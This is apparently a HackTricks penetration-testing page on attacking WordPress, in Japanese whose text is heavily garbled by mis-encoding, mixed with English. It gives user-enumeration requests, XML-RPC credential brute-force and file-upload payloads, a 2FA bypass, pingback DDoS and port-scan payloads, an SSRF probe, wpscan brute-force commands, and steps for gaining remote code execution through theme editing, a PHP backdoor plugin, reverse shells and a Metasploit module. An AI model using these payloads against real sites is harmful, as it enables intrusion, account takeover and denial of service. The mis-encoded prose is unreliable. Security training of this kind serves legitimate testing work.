# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## åŸºæœ¬æƒ…å ±

- **Uploaded** ãƒ•ã‚¡ã‚¤ãƒ«ã¯æ¬¡ã®å ´æ‰€ã«ä¿å­˜ã•ã‚Œã¾ã™: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** ãã®ãŸã‚ãƒ†ãƒ¼ãƒã® php ã‚’å¤‰æ›´ã—ã¦ RCE ã‚’å¾—ãŸã„å ´åˆã€ãŠãã‚‰ãã“ã®ãƒ‘ã‚¹ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€**theme twentytwelve** ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æ¬¡ã®å ´æ‰€ã® **404.php** ãƒ•ã‚¡ã‚¤ãƒ«ã« **ã‚¢ã‚¯ã‚»ã‚¹** ã§ãã¾ã™: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` ã«ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒ«ãƒ¼ãƒˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚
- ãƒã‚§ãƒƒã‚¯ã™ã¹ããƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ­ã‚°ã‚¤ãƒ³ãƒ‘ã‚¹: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **ä¸»ãª WordPress ãƒ•ã‚¡ã‚¤ãƒ«**

- `index.php`
- `license.txt` ã«ã¯ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ WordPress ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãªã©ã€æœ‰ç”¨ãªæƒ…å ±ãŒå«ã¾ã‚Œã¾ã™ã€‚
- `wp-activate.php` ã¯æ–°ã—ã„ WordPress ã‚µã‚¤ãƒˆã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã™ã‚‹éš›ã®ãƒ¡ãƒ¼ãƒ«æœ‰åŠ¹åŒ–ãƒ—ãƒ­ã‚»ã‚¹ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
- ãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ«ãƒ€ï¼ˆéš ã™ãŸã‚ã«åå‰ãŒå¤‰æ›´ã•ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ï¼‰:
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ã¯ã€HTTP ã‚’ãƒˆãƒ©ãƒ³ã‚¹ãƒãƒ¼ãƒˆæ©Ÿæ§‹ã€XML ã‚’ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°æ©Ÿæ§‹ã¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’é€å—ä¿¡ã§ãã‚‹ WordPress ã®æ©Ÿèƒ½ã‚’è¡¨ã™ãƒ•ã‚¡ã‚¤ãƒ«ã§ã™ã€‚ã“ã®ç¨®ã®é€šä¿¡ã¯ WordPress ã® [REST API](https://developer.wordpress.org/rest-api/reference) ã«ç½®ãæ›ãˆã‚‰ã‚Œã¦ã„ã¾ã™ã€‚
- `wp-content` ãƒ•ã‚©ãƒ«ãƒ€ã¯ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚„ãƒ†ãƒ¼ãƒãŒæ ¼ç´ã•ã‚Œã‚‹ä¸»è¦ãªãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-content/uploads/` ã¯ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ãŒä¿å­˜ã•ã‚Œã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-includes/` ã¯è¨¼æ˜æ›¸ã€ãƒ•ã‚©ãƒ³ãƒˆã€JavaScript ãƒ•ã‚¡ã‚¤ãƒ«ã€ã‚¦ã‚£ã‚¸ã‚§ãƒƒãƒˆãªã©ã®ã‚³ã‚¢ãƒ•ã‚¡ã‚¤ãƒ«ãŒæ ¼ç´ã•ã‚Œã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-sitemap.xml` WordPress 5.5 ä»¥é™ã§ã¯ã€å…¬é–‹æŠ•ç¨¿ã‚„å…¬é–‹ã§ã‚¯ã‚¨ãƒªå¯èƒ½ãªæŠ•ç¨¿ã‚¿ã‚¤ãƒ—ã‚„ã‚¿ã‚¯ã‚½ãƒãƒŸãƒ¼ã‚’å«ã‚€ sitemap XML ãƒ•ã‚¡ã‚¤ãƒ«ãŒç”Ÿæˆã•ã‚Œã¾ã™ã€‚

**Post exploitation**

- `wp-config.php` ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€WordPress ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æ¥ç¶šã™ã‚‹ãŸã‚ã«å¿…è¦ãªãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹åã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ›ã‚¹ãƒˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€èªè¨¼ã‚­ãƒ¼ãŠã‚ˆã³ã‚½ãƒ«ãƒˆã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ†ãƒ¼ãƒ–ãƒ«ã®ãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ãªã©ã®æƒ…å ±ãŒå«ã¾ã‚Œã¾ã™ã€‚ã“ã®è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã¯ DEBUG ãƒ¢ãƒ¼ãƒ‰ã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã€ãƒˆãƒ©ãƒ–ãƒ«ã‚·ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°æ™‚ã«å½¹ç«‹ã¡ã¾ã™ã€‚

### ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¨©é™

- **Administrator**
- **Editor**: è‡ªåˆ†ãŠã‚ˆã³ä»–è€…ã®æŠ•ç¨¿ã‚’å…¬é–‹ãƒ»ç®¡ç†ã§ãã¾ã™
- **Author**: è‡ªåˆ†ã®æŠ•ç¨¿ã‚’å…¬é–‹ãƒ»ç®¡ç†ã§ãã¾ã™
- **Contributor**: æŠ•ç¨¿ã‚’æ›¸ãç®¡ç†ã§ãã¾ã™ãŒã€å…¬é–‹ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“
- **Subscriber**: æŠ•ç¨¿ã‚’é–²è¦§ã—ã€è‡ªåˆ†ã®ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã‚’ç·¨é›†ã§ãã¾ã™

## **Passive Enumeration**

### **Get WordPress version**

`/license.txt` ã¾ãŸã¯ `/readme.html` ãƒ•ã‚¡ã‚¤ãƒ«ãŒå­˜åœ¨ã™ã‚‹ã‹ç¢ºèªã—ã¦ãã ã•ã„ã€‚

ãƒšãƒ¼ã‚¸ã® **ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰** å†…ã«ï¼ˆä¾‹: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)ï¼‰:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS ãƒªãƒ³ã‚¯ãƒ•ã‚¡ã‚¤ãƒ«

![](<../../images/image (533).png>)

- JavaScript ãƒ•ã‚¡ã‚¤ãƒ«

![](<../../images/image (524).png>)

### ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’å–å¾—
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ãƒ†ãƒ¼ãƒã‚’å–å¾—
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ä¸€èˆ¬çš„ãªãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®æŠ½å‡º
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

ãŠãã‚‰ãã™ã¹ã¦ã® Plugins and Themes ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ã™ã¹ã¦ã‚’ç™ºè¦‹ã™ã‚‹ã«ã¯ã€**actively Brute Force a list of Plugins and Themes** ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆå¹¸ã„ã€è‡ªå‹•åŒ–ãƒ„ãƒ¼ãƒ«ã«ã“ã‚Œã‚‰ã®ãƒªã‚¹ãƒˆãŒå«ã¾ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

### Users

- **ID Brute:** Brute Forcing ã«ã‚ˆã‚Š WordPress ã‚µã‚¤ãƒˆã®æœ‰åŠ¹ãª users IDs ã‚’å–å¾—ã—ã¾ã™:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ **200** ã¾ãŸã¯ **30X** ã®å ´åˆã€ãã® id ã¯ **æœ‰åŠ¹** ã§ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ **400** ã®å ´åˆã€ãã® id ã¯ **ç„¡åŠ¹** ã§ã™ã€‚

- **wp-json:** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã‚¯ã‚¨ãƒªã‚’æŠ•ã’ã¦ã¿ã¦ãã ã•ã„:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢ã™ã‚‹æƒ…å ±ã‚’æ˜ã‚‰ã‹ã«ã™ã‚‹åˆ¥ã® `/wp-json/` ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **ã“ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯æŠ•ç¨¿ã‚’è¡Œã£ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã¿ã‚’å…¬é–‹ã™ã‚‹ç‚¹ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚** **Only information about the users that has this feature enable will be provided**ã€‚

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.
ã¾ãŸã€**/wp-json/wp/v2/pages** ãŒ IP ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ leak ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ç‚¹ã«ã‚‚æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

- **Login username enumeration**: When login in **`/wp-login.php`** the **message** is **different** is the indicated **username exists or not**.
- **Login username enumeration**: **`/wp-login.php`** ã«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹éš›ã€è¡¨ç¤ºã•ã‚Œã‚‹ **ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸** ãŒ **ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®å­˜åœ¨æœ‰ç„¡ã§ç•°ãªã‚‹**ã€‚

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).
ã‚‚ã— `xml-rpc.php` ãŒæœ‰åŠ¹ã§ã‚ã‚Œã°ã€credentials brute-force ã‚’å®Ÿè¡Œã—ãŸã‚Šã€ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã—ã¦ DoS ã‚’ä»•æ›ã‘ã‚‹ãŸã‚ã«åˆ©ç”¨ã—ãŸã‚Šã§ãã¾ã™ã€‚(ä¾‹ãˆã°ã€ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ [using this](https://github.com/relarizky/wpxploit) ã‚’ä½¿ã£ã¦è‡ªå‹•åŒ–ã§ãã¾ã™)ã€‚

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:
æœ‰åŠ¹ã‹ç¢ºèªã™ã‚‹ã«ã¯ _**/xmlrpc.php**_ ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã€æ¬¡ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã£ã¦ãã ã•ã„:

**Check**
**ç¢ºèª**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ã¾ãŸã¯ **`metaWeblog.getUsersBlogs`** ã¯ã€brute-force credentials ã«ä½¿ç”¨ã§ãã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ã®ã„ãã¤ã‹ã§ã™ã€‚ã“ã‚Œã‚‰ã®ã„ãšã‚Œã‹ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã‚’é€ä¿¡ã§ãã¾ã™:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
èªè¨¼æƒ…å ±ãŒæœ‰åŠ¹ã§ãªã„å ´åˆã€200ã‚³ãƒ¼ãƒ‰ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹å†…ã«ã‚ã‚‹_"Incorrect username or password"_ã¨ã„ã†ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã¯ãšã§ã™ã€‚

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

æ­£ã—ã„èªè¨¼æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã¯ãƒ‘ã‚¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
ã¾ãŸã€åŒã˜ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§è¤‡æ•°ã®è³‡æ ¼æƒ…å ±ã‚’è©¦ã›ã‚‹ã®ã§ã€**ã‚ˆã‚Šé€Ÿã„æ–¹æ³•**ã§ã® brute-force ã« **`system.multicall`** ã‚’ä½¿ç”¨ã§ãã¾ã™:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¯ãƒ—ãƒ­ã‚°ãƒ©ãƒ å‘ã‘ã§äººé–“å‘ã‘ã§ã¯ãªãå¤ã„ãŸã‚ã€2FA ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€æœ‰åŠ¹ãª creds ã‚’æŒã£ã¦ã„ã‚‹ãŒãƒ¡ã‚¤ãƒ³ã®å…¥å£ãŒ 2FA ã«ã‚ˆã£ã¦ä¿è­·ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**xmlrpc.php ã‚’æ‚ªç”¨ã—ã¦ãã® creds ã§ 2FA ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‹ã‚‰è¡Œãˆã‚‹ã™ã¹ã¦ã®æ“ä½œãŒã§ãã‚‹ã‚ã‘ã§ã¯ãªã„ç‚¹ã«æ³¨æ„ã—ã¦ãã ã•ã„ãŒã€Ippsec ãŒ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) ã§èª¬æ˜ã—ã¦ã„ã‚‹ã‚ˆã†ã« RCE ã«åˆ°é”ã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

**DDoS or port scanning**

ãƒªã‚¹ãƒˆå†…ã« _**pingback.ping**_ ãŒè¦‹ã¤ã‹ã‚Œã°ã€Wordpress ã«ä»»æ„ã®ãƒ›ã‚¹ãƒˆ/ãƒãƒ¼ãƒˆã¸ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‰ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ã€**æ•°åƒ**ã® Wordpress **ã‚µã‚¤ãƒˆ**ã«ä¸€ã¤ã® **å ´æ‰€** ã¸ **ã‚¢ã‚¯ã‚»ã‚¹** ã•ã›ï¼ˆãã®å ´æ‰€ã§ **DDoS** ãŒç™ºç”Ÿã—ã¾ã™ï¼‰ã€ã‚ã‚‹ã„ã¯ Wordpress ã«å†…éƒ¨ **ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯** ã‚’ **ã‚¹ã‚­ãƒ£ãƒ³** ã•ã›ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼ˆä»»æ„ã®ãƒãƒ¼ãƒˆã‚’æŒ‡å®šå¯èƒ½ã§ã™ï¼‰ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

**faultCode** ã®å€¤ãŒ **0**ï¼ˆ17ï¼‰ã‚ˆã‚Š **å¤§ãã„** å ´åˆã€ãã®ãƒãƒ¼ãƒˆã¯é–‹ã„ã¦ã„ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã® **`system.multicall`** ã®ä½¿ç”¨ä¾‹ã‚’ç¢ºèªã—ã€ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ‚ªç”¨ã—ã¦DDoSã‚’å¼•ãèµ·ã“ã™æ–¹æ³•ã‚’å­¦ã‚“ã§ãã ã•ã„ã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯é€šå¸¸ Wordpress ã‚µã‚¤ãƒˆã®ãƒ«ãƒ¼ãƒˆã«å­˜åœ¨ã—ã¾ã™: **`/wp-cron.php`**\
ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã•ã‚Œã‚‹ã¨ã€**é‡ã„** MySQL **query** ãŒå®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ã€**attackers** ã«ã‚ˆã£ã¦ **DoS** ã‚’ **å¼•ãèµ·ã“ã™** ã®ã«åˆ©ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
ã¾ãŸã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ `wp-cron.php` ã¯å„ãƒšãƒ¼ã‚¸ãƒ­ãƒ¼ãƒ‰æ™‚ï¼ˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒ Wordpress ã®ä»»æ„ã®ãƒšãƒ¼ã‚¸ã‚’è¦æ±‚ã™ã‚‹ãŸã³ï¼‰ã«å‘¼ã³å‡ºã•ã‚Œã‚‹ãŸã‚ã€ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®å¤šã„ã‚µã‚¤ãƒˆã§ã¯å•é¡Œï¼ˆDoSï¼‰ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

Wp-Cron ã‚’ç„¡åŠ¹åŒ–ã—ã€ãƒ›ã‚¹ãƒˆå†…ã§å®šæœŸçš„ã«å¿…è¦ãªå‡¦ç†ã‚’è¡Œã† real cronjob ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚’æ¨å¥¨ã—ã¾ã™ï¼ˆå•é¡Œã‚’å¼•ãèµ·ã“ã•ãªã„ã‚ˆã†ã«ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ **methodName: pingback.ping** ã¨ãƒ‘ã‚¹ **/wp-json/oembed/1.0/proxy** ãŒå­˜åœ¨ã™ã‚‹ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€å­˜åœ¨ã™ã‚‹å ´åˆã¯ãã‚Œã‚‰ã‚’åˆ©ç”¨ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## ãƒ“ãƒƒãƒˆã‚’ä¸Šæ›¸ãã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹

å®Ÿéš›ã®æ”»æ’ƒã¨ã„ã†ã‚ˆã‚Šå¥½å¥‡å¿ƒçš„ãªè©±ã§ã™ã€‚CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ã§ã¯ä»»æ„ã® wordpress ãƒ•ã‚¡ã‚¤ãƒ«ã®1ãƒ“ãƒƒãƒˆã‚’åè»¢ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚ä¾‹ãˆã°ãƒ•ã‚¡ã‚¤ãƒ« `/var/www/html/wp-includes/user.php` ã®ä½ç½® `5389` ã®ãƒ“ãƒƒãƒˆã‚’åè»¢ã•ã›ã€NOT (`!`) æ¼”ç®—ã‚’ NOP åŒ–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **ãƒ‘ãƒãƒ« RCE**

**ãƒ†ãƒ¼ãƒã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ php ã‚’å¤‰æ›´ã™ã‚‹ï¼ˆç®¡ç†è€…ã®èªè¨¼æƒ…å ±ãŒå¿…è¦ï¼‰**

å¤–è¦³ â†’ ãƒ†ãƒ¼ãƒã‚¨ãƒ‡ã‚£ã‚¿ãƒ¼ â†’ 404 ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆï¼ˆå³å´ï¼‰

php ã‚·ã‚§ãƒ«ã®å†…å®¹ã«å¤‰æ›´ã™ã‚‹:

![](<../../images/image (384).png>)

æ›´æ–°ã—ãŸãƒšãƒ¼ã‚¸ã«ã©ã†ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã‹ã‚’ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§èª¿ã¹ã¦ãã ã•ã„ã€‚ã“ã®å ´åˆã€ã“ã“ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ä½¿ç”¨ã§ãã‚‹ã‚‚ã®:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å–å¾—ã™ã‚‹ãŸã‚ã€‚

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
ä¾‹ãˆã°æ¬¡ã®ã‚ˆã†ã«php backdoorã‚’ä½œæˆã—ã¾ã™:

![](<../../images/image (183).png>)

æ¬¡ã«æ–°ã—ã„ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’è¿½åŠ ã—ã¾ã™:

![](<../../images/image (722).png>)

ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦Install Nowã‚’æŠ¼ã—ã¾ã™:

![](<../../images/image (249).png>)

ã€ŒProccedã€ã‚’ã‚¯ãƒªãƒƒã‚¯:

![](<../../images/image (70).png>)

ãŠãã‚‰ãè¦‹ãŸç›®ã«ã¯ä½•ã‚‚èµ·ããªã„ã“ã¨ãŒå¤šã„ã§ã™ãŒã€Mediaã«ç§»å‹•ã™ã‚‹ã¨ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸshellãŒè¡¨ç¤ºã•ã‚Œã¾ã™:

![](<../../images/image (462).png>)

ãã‚Œã‚’é–‹ãã¨ã€reverse shellã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®URLãŒè¡¨ç¤ºã•ã‚Œã¾ã™:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

ã“ã®æ–¹æ³•ã¯ã€è„†å¼±ã§ã‚ã‚‹ã“ã¨ãŒçŸ¥ã‚‰ã‚Œã¦ã„ã‚‹æ‚ªæ„ã‚ã‚‹ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã‚’ä¼´ã„ã€web shellã‚’å–å¾—ã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã§ãã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯WordPressã®ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã‹ã‚‰æ¬¡ã®ã‚ˆã†ã«å®Ÿè¡Œã•ã‚Œã¾ã™:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPressã®ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã§ `Dashboard > Plugins > Upload Plugin` ã«ç§»å‹•ã—ã¾ã™ã€‚
- ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®zipãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
